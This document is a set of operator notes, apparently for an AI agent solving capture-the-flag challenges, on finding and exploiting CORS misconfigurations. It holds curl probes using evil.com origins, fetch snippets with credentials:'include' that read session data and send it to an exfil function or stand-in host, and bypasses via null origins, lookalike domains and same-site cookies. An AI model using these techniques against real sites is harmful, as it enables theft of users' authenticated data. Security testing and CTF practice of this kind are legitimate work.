# Operator notes — the practical CORS guidance for a working agent

The 'how to actually do this' notes — the operational detail beyond
the theory.

---

## 1. The very first command — always

```bash
curl -s -i -b "$CJ" "$BASE/api/me" -H 'Origin: https://evil.com' | \
  grep -iE 'access-control-(allow-origin|allow-credentials)'
```

This ONE command answers 'is the CORS open' — the reflected ACAO +
the ACAC together. every CORS assessment starts here.

## 2. The cookie check — always second

```bash
curl -s -i -b "$CJ" "$BASE/" | grep -i 'set-cookie'
```

The SameSite decides whether the cookie actually rides the fetch —
an open CORS with a Lax cookie is a non-credentialed read.

## 3. The `*`-endpoint trap — don't over-credit

```text
a `*` on a sensitive endpoint is a PUBLIC read — the browser rejects
`*`+credentials. never claim a `*` endpoint is a CORS vuln — it's a
public-API, not a misconfig.
```

## 4. The reflected-ACAO-is-a-candidate rule

```text
a reflected ACAO+ACAC is a CANDIDATE — the read is possible, not
yet proven. the CONFIRMS is the exfil — the data reaching your
listener. don't claim 'vulnerable' until the exfil lands.
```

## 5. The `Origin: null` — always test it

```text
'null' is in the allowlist more often than you'd expect — a leftover
from local testing, a deliberate 'allow file:/sandboxed' that an
attacker data: URL exploits. always include 'null' in the battery.
```

## 6. The lookalike-domain — always test the battery

```text
a 'fixed' ACAO is often a startswith/endswith/substring check, not
a true allowlist — test target.com.evil.com, eviltarget.com,
evil-target.com, sub.target.com before concluding 'closed'.
```

## 7. The `credentials:'include'` — never forget it

```js
// the fetch MUST ask to send credentials — the default is 'same-origin'
fetch('https://t/api/me',{credentials:'include'})
// without it → no cookie → a non-credentialed read
```

## 8. The `.json()` vs `.text()` — match the content-type

```js
// a JSON API → .json()
fetch(url,{credentials:'include'}).then(r=>r.json()).then(d=>exfil(d))
// an HTML page → .text() + a regex
fetch(url,{credentials:'include'}).then(r=>r.text()).then(h=>{
  var m=h.match(/FLAG\{[^}]+\}/); if(m)exfil(m[0])})
```

## 9. The `.catch` — never skip it

```js
.then(d=>exfil(d))
.catch(e=>fetch('https://a/?err='+encodeURIComponent(e)))
// an unfired exfil is a SILENT failure — always record the error
```

## 10. The exfil reachability — match to the bot

```text
the bot reaches your domain → a fetch/img/beacon exfil
the bot can't reach it      → a write-back or a DOM-writeback
a fetch-blocking CSP        → a no-CORS exfil (img/beacon/form)
```

## 11. The bot's session — verify it's the flag-holder's

```text
the exploit reads under the BOT's session — not yours. verify the
bot carries the flag cookie / admin context — a bot that's a plain
visitor reads a plain session.
```

## 12. The airgapped-bot delivery — the data: URL

```text
an airgapped bot can't fetch attacker.com — the exploit must be a
data: URL (the page IS the URL, Origin 'null') or a stored page.
the exfil can still be a write-back or a beacon IF the bot reaches
the listener.
```

## 13. The same-site-cross-origin trick — the Lax bypass

```text
a fetch 'app.t.com' → 'api.t.com' is CROSS-ORIGIN (CORS applies) but
SAME-SITE (a Lax cookie attaches). a page on app.t.com (a subdomain
XSS or a controlled sub) reads a Lax-cookie session on api.t.com —
the SameSite gate doesn't help; only the CORS gate does.
```

## 14. The preflight-skip — a simple request always

```text
a GET or urlencoded POST with no custom headers is SIMPLE — skips
the preflight. when a custom header's preflight fails, the simple
request still works — only the actual ACAO gates it.
```

## 15. The endpoint choice — read the sensitive one

```text
a reflected ACAO on a PUBLIC endpoint is noise — read the endpoint
carrying the flag (/api/me, /api/flag). the CORS-open endpoint must
return SESSION data to be the vuln.
```

## 16. The unique-Origin test — defeat the cache

```bash
curl -s -i -b "$CJ" "$BASE/api/me" -H "Origin: https://evil-$RANDOM.com"
# a unique Origin per test → a cached response can't lie
```

## 17. The `Vary: Origin` check — does the cache key on it

```bash
curl -s -i -b "$CJ" "$BASE/api/me" -H 'Origin: https://a.com' | grep -i 'vary'
# Vary: Origin → per-origin — each test clean; no Vary → a cache edge
```

## 18. The alternate-read — check before declaring 'closed'

```text
CORS closed? check a JSONP endpoint (?callback=), a ws channel, a
postMessage broadcast, an XSS surface — the read may still work
through a non-CORS channel.
```

## 19. The two-header check — read ACAO AND ACAC together

```bash
curl -s -i -b "$CJ" "$BASE/api/me" -H 'Origin: https://evil.com' | \
  grep -iE 'access-control-allow-(origin|credentials)'
# the PAIR decides — reflected+ACAC → credentialed; reflected alone → public
```

## 20. The ledger — record every measurement

```bash
# the measurement is the hypothesis — the read is the confirm
python3 tools/state.py <c> --hypothesis \
  "cors: ACAO=<v> ACAC=<t/f> on /api/<ep> — <shape>"
python3 tools/hooks.py post-probe <c> --verdict <v> --hypothesis-id <H> \
  --class web-cors --evidence-kind <k> --evidence '<what>' --response '<bytes>'
```
